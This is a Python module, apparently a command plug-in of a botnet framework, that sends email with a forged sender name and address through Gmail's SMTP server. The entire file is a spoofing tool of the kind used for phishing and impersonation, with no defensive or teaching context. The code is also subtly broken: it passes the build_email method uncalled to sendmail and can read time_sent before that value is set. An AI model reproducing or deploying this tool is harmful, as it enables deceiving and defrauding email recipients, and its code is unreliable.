import smtplib
import time

from botnet.commands.command_base import CommandBase

class EmailSpoof(CommandBase):
    def __init__(self, username, password, fake_from, fake_name, to_email, to_name, subject, content):
        self.username = username
        self.password = password
        self.fake_from = fake_from
        self.fake_name = fake_name
        self.to_email = to_email
        self.to_name = to_name
        self.subject = subject
        self.content = content

    def get_metrics(self):
        return f"Email sent at {self.time_sent}"

    def execute(self): 
        server = smtplib.SMTP("smtp.gmail.com", 587) 
        server.starttls() 
        server.login(self.username, self.password) 
        server.sendmail(self.username, self.to_email, self.build_email) 
        server.close()
        self.time_sent = time.ctime(time.time())

    def build_email(self):
        # build the complete email message from all variables
        return f"From: {self.fake_name} <{self.fake_from}>\nTo: {self.to_name} <{self.to_email}>\nSubject: {self.subject}\n\n{self.content}"